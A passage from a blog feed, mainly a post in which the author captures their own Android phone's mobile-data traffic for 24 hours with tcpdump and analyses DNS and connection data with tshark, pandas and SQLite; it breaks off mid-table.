                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                169
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                170
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                171
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                172
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                173
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                174
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                175
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                176
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                177
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                178
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                179
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                180
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                181
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                182
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                183
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                184
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                185
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                186
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                187
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/link
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                188
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                189
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                190
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                191
                              &lt;/th&gt;

                              &lt;td&gt;
                                t.skimresources.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/track.php
                              &lt;/td&gt;

                              &lt;td&gt;
                                None
                              &lt;/td&gt;
                            &lt;/tr&gt;
</code></pre>
</table>
</div>
]]></content:encoded>
    </item>
    
    <item>
      <title>24h Android sniffing using tcpdump - IPython Notebook Version</title>
      <link>https://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump-ipython-notebook-version/</link>
      <pubDate>Thu, 23 Jan 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump-ipython-notebook-version/</guid>
      <content:encoded><![CDATA[<h1 id="motivation">Motivation</h1>
<p>I&rsquo;ve started this little project since I was mainly interested in the data my smartphone is sending all the time without my knowledge. I have a bunch of apps installed on my phone and I have absolutely no ideea which (kind of) data is beeing transfered to the Internet all day long. I thought I&rsquo;d be a great ideea to monitor/sniff my data interface (3G, Edge etc. NOT Wifi) for 24h during my normal daily phone usage.</p>
<h1 id="sniff-environment">Sniff environment</h1>
<p>I&rsquo;ve used my Samsung Note 1 (GT N7000) as sniffing device. At the moment I use a customized ROM (slimbean) with root access. In order to be to use sniffing tools on my phone I had to work in a chrooted environment like &ldquo;Debian on Android&rdquo;. This way I was given access to phones data interfaces and I was ready to go.</p>
<pre><code>u0_a99@android:/ $ deb
e2fsck 1.41.11 (14-Mar-2010)
/storage/sdcard1/debian-kit/debian.img: recovering journal
/storage/sdcard1/debian-kit/debian.img: clean, 55210/170752 files, 426942/512000 blocks
root@debian-on-android:/# ifconfig -a
...
rmnet0    Link encap:Point-to-Point Protocol  
      POINTOPOINT NOARP MULTICAST  MTU:1500  Metric:1
      RX packets:37490 errors:0 dropped:0 overruns:0 frame:0
      TX packets:30841 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000 
      RX bytes:34233580 (32.6 MiB)  TX bytes:5906191 (5.6 MiB)
</code></pre>
<p>Initially I wanted to use tshark for the sniffing part but it didn&rsquo;t work quite well. So I came back to old school tcpdump.
Since my data interface was going done all the time I had to make sure that tcpdump was restarted as soon as the data interface was online again. I used the following script:</p>
<pre><code>root@debian-on-android:~# cat monitor.sh 
#!/bin/bash

DATE=`date +&quot;%Y-%m-%d-%s&quot;`

while true; 
do 
    tcpdump -i rmnet0 -np -w output-`date +&quot;%Y-%m-%d-%s&quot;`.pcap; sleep 10 
done
</code></pre>
<p>I&rsquo;ve fired up my script and after 24 hours I had these outputs:</p>
<pre><code>root@debian-on-android:~# ls -l output-2014-01-1*
-rw-r--r--. 1 root root    24907 Jan 18 12:53 output-2014-01-18-1390049466.pcap
-rw-r--r--. 1 root root     2881 Jan 18 12:55 output-2014-01-18-1390049736.pcap
-rw-r--r--. 1 root root 14963016 Jan 18 14:02 output-2014-01-18-1390049777.pcap
-rw-r--r--. 1 root root 54695690 Jan 19 14:03 output-2014-01-18-1390053867.pcap
-rw-r--r--. 1 root root 12492822 Jan 19 16:27 output-2014-01-19-1390140216.pcap
root@debian-on-android:~# 
</code></pre>
<h1 id="merge-pcap-files">Merge pcap files</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ mergecap -F libpcap -a output-* -w merged.pcap
</code></pre></div><h1 id="convert-pcap-to-sqlite3-db">Convert pcap to SQLite3 DB</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PCAP_FILE = &#34;/home/victor/work/Projects/24h-Android-Monitoring/pcap/merged.pcap&#34;

# Tshark generated files
DNS_QUERIES  = &#34;/home/victor/work/Projects/24h-Android-Monitoring/pcap/dns_queries.csv&#34;
CONNECTIONS  = &#34;/home/victor/work/Projects/24h-Android-Monitoring/pcap/connections.csv&#34;
HTTP_TRAFFIC = &#34;/home/victor/work/Projects/24h-Android-Monitoring/pcap/http_traffic.csv&#34;
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><h1 id="extract-valuable-information-from-pcap-file">Extract valuable information from pcap file</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">dns_queries = !tshark -r $PCAP_FILE  -R &#34;dns.flags.response == 1&#34;  -E occurrence=f -E header=y \
              -T fields  -e frame.number -e frame.time -e dns.qry.name -e dns.resp.addr &gt; $DNS_QUERIES
    
connections = !tshark -r $PCAP_FILE -E header=y -E separator=\; -T fields -e frame.number \
              -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e frame.protocols &gt; $CONNECTIONS

http_traffic = !tshark -r $PCAP_FILE -Y &#34;http.request&#34; -E header=y -T fields \
              -e frame.number -e frame.time -e ip.dst -e http.request.method -e http.request.uri -e http.user_agent \
              -e http.response.code  -e http.response.phrase -e http.content_length -e data -e text &gt; $HTTP_TRAFFIC
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import sqlite3 as sql
con = sql.connect(&#34;:memory:&#34;)
cur = con.cursor()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import binascii
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import pandas.io.sql as pdsql 

# Pandas settings
pd.set_option(&#39;display.height&#39;, 500)
pd.set_option(&#39;display.max_rows&#39;, 500)
pd.set_option(&#39;display.max_columns&#39;, 500)
pd.set_option(&#39;display.width&#39;, 500)
pd.set_option(&#39;display.max_colwidth&#39;, 1000)

# Useful functions
def hex2str(s):
    if str(s) == &#39;nan&#39;:
        return None
    else:
        return bytes.fromhex(str(s)).decode(&#39;utf-8&#39;)
    
# Import DNS queries
dns_df = pd.read_table(DNS_QUERIES)
dns_df.columns = [&#39;frame_number&#39;, &#39;frame_time&#39;, &#39;dns_query&#39;, &#39;dns_response&#39;]

# Import connections
con_df = pd.read_table(CONNECTIONS, sep=&#34;;&#34;)
con_df.columns = [&#39;frame_number&#39;, &#39;frame_time&#39;, &#39;src&#39;, &#39;dst&#39;, &#39;dstport&#39;, &#39;frame_protocols&#39;]

# Import http traffic
http_df = pd.read_table(HTTP_TRAFFIC)
http_df.columns = [&#39;frame_number&#39;, &#39;frame_time&#39;, &#39;ip_dst&#39;,&#39;request_method&#39;, &#39;request_uri&#39;, &#39;user_agent&#39;,&#39;response_code&#39;, &#39;response_phrase&#39;,&#39;content_length&#39;, &#39;data&#39;, &#39;text&#39;]

# Convert data (hex) to ascii
convert_data = lambda x: hex2str(x)
http_df[&#39;data&#39;] = http_df[&#39;data&#39;].apply(convert_data)


# Write to SQLite
pdsql.write_frame(dns_df, name=&#34;dns&#34;, con=con, if_exists=&#34;delete&#34;)
pdsql.write_frame(con_df, name=&#34;connection&#34;, con=con, if_exists=&#34;delete&#34;)
pdsql.write_frame(http_df, name=&#34;http&#34;, con=con, if_exists=&#34;delete&#34;)

dns_df.head(5)

#p2 = pdsql.read_frame(&#34;&#34;&#34;SELECT COUNT(dns_response), dns_query FROM dns&#34;&#34;&#34;, cnx)
#p2

# Count unique values
#unique_dns = dns_df.groupby(&#39;DNS Query&#39;)[&#39;DNS Response&#39;].nunique().reset_index()
#unique_dns.columns = [&#39;DNS&#39;, &#39;# DNS Queries&#39;]
#unique_dns.sort([&#39;# DNS Queries&#39;], ascending=False).head(10)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>frame_number</th>
      <th>frame_time</th>
      <th>dns_query</th>
      <th>dns_response</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>  4</td>
      <td> Jan 18, 2014 13:52:43.079188000</td>
      <td> clients3.google.com</td>
      <td> 173.194.70.138</td>
    </tr>
    <tr>
      <th>1</th>
      <td>  5</td>
      <td> Jan 18, 2014 13:52:43.079389000</td>
      <td> orcart.facebook.com</td>
      <td>  69.171.248.65</td>
    </tr>
    <tr>
      <th>2</th>
      <td> 29</td>
      <td> Jan 18, 2014 13:52:43.775665000</td>
      <td>    mtalk.google.com</td>
      <td> 173.194.70.188</td>
    </tr>
    <tr>
      <th>3</th>
      <td> 71</td>
      <td> Jan 18, 2014 13:52:46.433026000</td>
      <td>      push.parse.com</td>
      <td>   23.22.41.206</td>
    </tr>
    <tr>
      <th>4</th>
      <td> 82</td>
      <td> Jan 18, 2014 13:52:47.243004000</td>
      <td>    e16.whatsapp.net</td>
      <td>   50.22.225.86</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><h1 id="top-dns-queries">Top DNS queries</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p1 = pdsql.read_frame(&#34;&#34;&#34;
    SELECT COUNT(dns_response) AS &#39;# DNS Responses&#39;, dns_query AS &#39;DNS to lookup&#39; 
    FROM dns GROUP BY dns_query 
    ORDER by 1 DESC
&#34;&#34;&#34;, con)
#print(p1.head(100).to_string())
p1.head(100)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th># DNS Responses</th>
      <th>DNS to lookup</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> 670</td>
      <td>           graph.facebook.com</td>
    </tr>
    <tr>
      <th>1 </th>
      <td> 535</td>
      <td>               www.google.com</td>
    </tr>
    <tr>
      <th>2 </th>
      <td> 435</td>
      <td>          orcart.facebook.com</td>
    </tr>
    <tr>
      <th>3 </th>
      <td> 360</td>
      <td>       android.googleapis.com</td>
    </tr>
    <tr>
      <th>4 </th>
      <td> 340</td>
      <td>           www.googleapis.com</td>
    </tr>
    <tr>
      <th>5 </th>
      <td> 295</td>
      <td>         fbprod.flipboard.com</td>
    </tr>
    <tr>
      <th>6 </th>
      <td> 245</td>
      <td>   android.clients.google.com</td>
    </tr>
    <tr>
      <th>7 </th>
      <td> 190</td>
      <td>             ad.flipboard.com</td>
    </tr>
    <tr>
      <th>8 </th>
      <td> 165</td>
      <td>               push.parse.com</td>
    </tr>
    <tr>
      <th>9 </th>
      <td> 155</td>
      <td>          play.googleapis.com</td>
    </tr>
    <tr>
      <th>10</th>
      <td> 150</td>
      <td>            cdn.flipboard.com</td>
    </tr>
    <tr>
      <th>11</th>
      <td> 130</td>
      <td>        apresolve.spotify.com</td>
    </tr>
    <tr>
      <th>12</th>
      <td> 120</td>
      <td>                www.google.de</td>
    </tr>
    <tr>
      <th>13</th>
      <td> 115</td>
      <td>           b-api.facebook.com</td>
    </tr>
    <tr>
      <th>14</th>
      <td>  80</td>
      <td>                pbs.twimg.com</td>
    </tr>
    <tr>
      <th>15</th>
      <td>  75</td>
      <td>          ticks2.bugsense.com</td>
    </tr>
    <tr>
      <th>16</th>
      <td>  70</td>
      <td>     settings.crashlytics.com</td>
    </tr>
    <tr>
      <th>17</th>
      <td>  60</td>
      <td>             www.theverge.com</td>
    </tr>
    <tr>
      <th>18</th>
      <td>  55</td>
      <td>                e.apsalar.com</td>
    </tr>
    <tr>
      <th>19</th>
      <td>  55</td>
      <td>                  twitter.com</td>
    </tr>
    <tr>
      <th>20</th>
      <td>  50</td>
      <td>                 i1.ytimg.com</td>
    </tr>
    <tr>
      <th>21</th>
      <td>  50</td>
      <td>      polpix.sueddeutsche.com</td>
    </tr>
    <tr>
      <th>22</th>
      <td>  45</td>
      <td>              bilder1.n-tv.de</td>
    </tr>
    <tr>
      <th>23</th>
      <td>  45</td>
      <td>            feeds.reuters.com</td>
    </tr>
    <tr>
      <th>24</th>
      <td>  45</td>
      <td>            www.tagesschau.de</td>
    </tr>
    <tr>
      <th>25</th>
      <td>  40</td>
      <td>           mobile.twitter.com</td>
    </tr>
    <tr>
      <th>26</th>
      <td>  40</td>
      <td>             mtalk.google.com</td>
    </tr>
    <tr>
      <th>27</th>
      <td>  40</td>
      <td>     s2.googleusercontent.com</td>
    </tr>
    <tr>
      <th>28</th>
      <td>  40</td>
      <td>     www.googleadservices.com</td>
    </tr>
    <tr>
      <th>29</th>
      <td>  35</td>
      <td>              bilder2.n-tv.de</td>
    </tr>
    <tr>
      <th>30</th>
      <td>  35</td>
      <td>              bilder3.n-tv.de</td>
    </tr>
    <tr>
      <th>31</th>
      <td>  35</td>
      <td>              bilder4.n-tv.de</td>
    </tr>
    <tr>
      <th>32</th>
      <td>  35</td>
      <td>        ecx.images-amazon.com</td>
    </tr>
    <tr>
      <th>33</th>
      <td>  30</td>
      <td>              cdn1.spiegel.de</td>
    </tr>
    <tr>
      <th>34</th>
      <td>  30</td>
      <td>              cdn2.spiegel.de</td>
    </tr>
    <tr>
      <th>35</th>
      <td>  30</td>
      <td>            e.crashlytics.com</td>
    </tr>
    <tr>
      <th>36</th>
      <td>  30</td>
      <td>        weather.yahooapis.com</td>
    </tr>
    <tr>
      <th>37</th>
      <td>  30</td>
      <td>               www.amazon.com</td>
    </tr>
    <tr>
      <th>38</th>
      <td>  25</td>
      <td>              api.twitter.com</td>
    </tr>
    <tr>
      <th>39</th>
      <td>  25</td>
      <td>          clients4.google.com</td>
    </tr>
    <tr>
      <th>40</th>
      <td>  25</td>
      <td>             e12.whatsapp.net</td>
    </tr>
    <tr>
      <th>41</th>
      <td>  25</td>
      <td>             e16.whatsapp.net</td>
    </tr>
    <tr>
      <th>42</th>
      <td>  25</td>
      <td>              e4.whatsapp.net</td>
    </tr>
    <tr>
      <th>43</th>
      <td>  25</td>
      <td>     mobile.smartadserver.com</td>
    </tr>
    <tr>
      <th>44</th>
      <td>  25</td>
      <td>        photos-d.ak.fbcdn.net</td>
    </tr>
    <tr>
      <th>45</th>
      <td>  25</td>
      <td>      scontent-a.xx.fbcdn.net</td>
    </tr>
    <tr>
      <th>46</th>
      <td>  25</td>
      <td>             www.facebook.com</td>
    </tr>
    <tr>
      <th>47</th>
      <td>  25</td>
      <td>       www.fahrinfo-berlin.de</td>
    </tr>
    <tr>
      <th>48</th>
      <td>  25</td>
      <td>     www.google-analytics.com</td>
    </tr>
    <tr>
      <th>49</th>
      <td>  20</td>
      <td>              apis.google.com</td>
    </tr>
    <tr>
      <th>50</th>
      <td>  20</td>
      <td>              cdn3.spiegel.de</td>
    </tr>
    <tr>
      <th>51</th>
      <td>  20</td>
      <td>              cdn4.spiegel.de</td>
    </tr>
    <tr>
      <th>52</th>
      <td>  20</td>
      <td>              de.sitestat.com</td>
    </tr>
    <tr>
      <th>53</th>
      <td>  20</td>
      <td>             e10.whatsapp.net</td>
    </tr>
    <tr>
      <th>54</th>
      <td>  20</td>
      <td>             e11.whatsapp.net</td>
    </tr>
    <tr>
      <th>55</th>
      <td>  20</td>
      <td>             e13.whatsapp.net</td>
    </tr>
    <tr>
      <th>56</th>
      <td>  20</td>
      <td>              e3.whatsapp.net</td>
    </tr>
    <tr>
      <th>57</th>
      <td>  20</td>
      <td>              e9.whatsapp.net</td>
    </tr>
    <tr>
      <th>58</th>
      <td>  20</td>
      <td> fbcdn-profile-a.akamaihd.net</td>
    </tr>
    <tr>
      <th>59</th>
      <td>  20</td>
      <td>  googleads.g.doubleclick.net</td>
    </tr>
    <tr>
      <th>60</th>
      <td>  20</td>
      <td>               gwp.nuggad.net</td>
    </tr>
    <tr>
      <th>61</th>
      <td>  20</td>
      <td>               imap.gmail.com</td>
    </tr>
    <tr>
      <th>62</th>
      <td>  20</td>
      <td>                  img.welt.de</td>
    </tr>
    <tr>
      <th>63</th>
      <td>  20</td>
      <td>               media0.faz.net</td>
    </tr>
    <tr>
      <th>64</th>
      <td>  20</td>
      <td>  oauth.googleusercontent.com</td>
    </tr>
    <tr>
      <th>65</th>
      <td>  20</td>
      <td>                  p5.focus.de</td>
    </tr>
    <tr>
      <th>66</th>
      <td>  20</td>
      <td>               script.ioam.de</td>
    </tr>
    <tr>
      <th>67</th>
      <td>  20</td>
      <td>              ssl.gstatic.com</td>
    </tr>
    <tr>
      <th>68</th>
      <td>  20</td>
      <td>                 www.golem.de</td>
    </tr>
    <tr>
      <th>69</th>
      <td>  15</td>
      <td>          accounts.google.com</td>
    </tr>
    <tr>
      <th>70</th>
      <td>  15</td>
      <td>             api.facebook.com</td>
    </tr>
    <tr>
      <th>71</th>
      <td>  15</td>
      <td>               api.tunigo.com</td>
    </tr>
    <tr>
      <th>72</th>
      <td>  15</td>
      <td>          cdn.api.twitter.com</td>
    </tr>
    <tr>
      <th>73</th>
      <td>  15</td>
      <td>         connect.facebook.net</td>
    </tr>
    <tr>
      <th>74</th>
      <td>  15</td>
      <td>                   de.ioam.de</td>
    </tr>
    <tr>
      <th>75</th>
      <td>  15</td>
      <td>                dl.google.com</td>
    </tr>
    <tr>
      <th>76</th>
      <td>  15</td>
      <td>              e1.whatsapp.net</td>
    </tr>
    <tr>
      <th>77</th>
      <td>  15</td>
      <td>             e14.whatsapp.net</td>
    </tr>
    <tr>
      <th>78</th>
      <td>  15</td>
      <td>              e2.whatsapp.net</td>
    </tr>
    <tr>
      <th>79</th>
      <td>  15</td>
      <td>              e6.whatsapp.net</td>
    </tr>
    <tr>
      <th>80</th>
      <td>  15</td>
      <td>              e7.whatsapp.net</td>
    </tr>
    <tr>
      <th>81</th>
      <td>  15</td>
      <td>              e8.whatsapp.net</td>
    </tr>
    <tr>
      <th>82</th>
      <td>  15</td>
      <td>            gdata.youtube.com</td>
    </tr>
    <tr>
      <th>83</th>
      <td>  15</td>
      <td>                getpocket.com</td>
    </tr>
    <tr>
      <th>84</th>
      <td>  15</td>
      <td>               images.zeit.de</td>
    </tr>
    <tr>
      <th>85</th>
      <td>  15</td>
      <td>                    m.faz.net</td>
    </tr>
    <tr>
      <th>86</th>
      <td>  15</td>
      <td>               media1.faz.net</td>
    </tr>
    <tr>
      <th>87</th>
      <td>  15</td>
      <td>                p.twitter.com</td>
    </tr>
    <tr>
      <th>88</th>
      <td>  15</td>
      <td>         platform.twitter.com</td>
    </tr>
    <tr>
      <th>89</th>
      <td>  15</td>
      <td>      scontent-b.xx.fbcdn.net</td>
    </tr>
    <tr>
      <th>90</th>
      <td>  15</td>
      <td>      stats.g.doubleclick.net</td>
    </tr>
    <tr>
      <th>91</th>
      <td>  15</td>
      <td>           sueddeut.ivwbox.de</td>
    </tr>
    <tr>
      <th>92</th>
      <td>  15</td>
      <td>             sz.met.vgwort.de</td>
    </tr>
    <tr>
      <th>93</th>
      <td>  15</td>
      <td>                tags.w55c.net</td>
    </tr>
    <tr>
      <th>94</th>
      <td>  15</td>
      <td>                  www.faz.net</td>
    </tr>
    <tr>
      <th>95</th>
      <td>  15</td>
      <td>                 www.heute.de</td>
    </tr>
    <tr>
      <th>96</th>
      <td>  15</td>
      <td>          www.sueddeutsche.de</td>
    </tr>
    <tr>
      <th>97</th>
      <td>  15</td>
      <td>                   www.taz.de</td>
    </tr>
    <tr>
      <th>98</th>
      <td>  10</td>
      <td>                 a0.twimg.com</td>
    </tr>
    <tr>
      <th>99</th>
      <td>  10</td>
      <td>        api.geo.kontagent.net</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p_testing = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT COUNT(c.dst),c.dst, c.dstport, c.frame_protocols FROM connection AS c 
    JOIN dns AS d ON c.dst=d.dns_response
    WHERE c.dst == &#34;173.194.70.95&#34; AND c.dst NOT LIKE &#34;10.%&#34;
    ORDER by 1 DESC
&#34;&#34;&#34;, con)
#p_testing.head(100)

p_testing = pdsql.read_frame(&#34;&#34;&#34;
    SELECT COUNT(*), (SELECT dns_query FROM dns WHERE dns_response=c.dst LIMIT 1) as DNS, c.dstport, c.frame_protocols FROM connection AS c
    WHERE c.dst NOT LIKE &#34;10.%&#34;
    GROUP by 2
    ORDER by 1 DESC
&#34;&#34;&#34;, con)
p_testing.head(100)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>COUNT(*)</th>
      <th>DNS</th>
      <th>dstport</th>
      <th>frame_protocols</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> 5570</td>
      <td>                     cdn.flipboard.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>1 </th>
      <td> 5248</td>
      <td>                   orcart.facebook.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>2 </th>
      <td> 4670</td>
      <td>                  fbprod.flipboard.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>3 </th>
      <td> 4446</td>
      <td>                    www.googleapis.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>4 </th>
      <td> 4418</td>
      <td>                    graph.facebook.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>5 </th>
      <td> 2744</td>
      <td>                        media1.faz.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>6 </th>
      <td> 2642</td>
      <td>                                  None</td>
      <td>  NaN</td>
      <td> sll:ip:icmp:ip:udp:dns</td>
    </tr>
    <tr>
      <th>7 </th>
      <td> 2477</td>
      <td>                        www.google.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
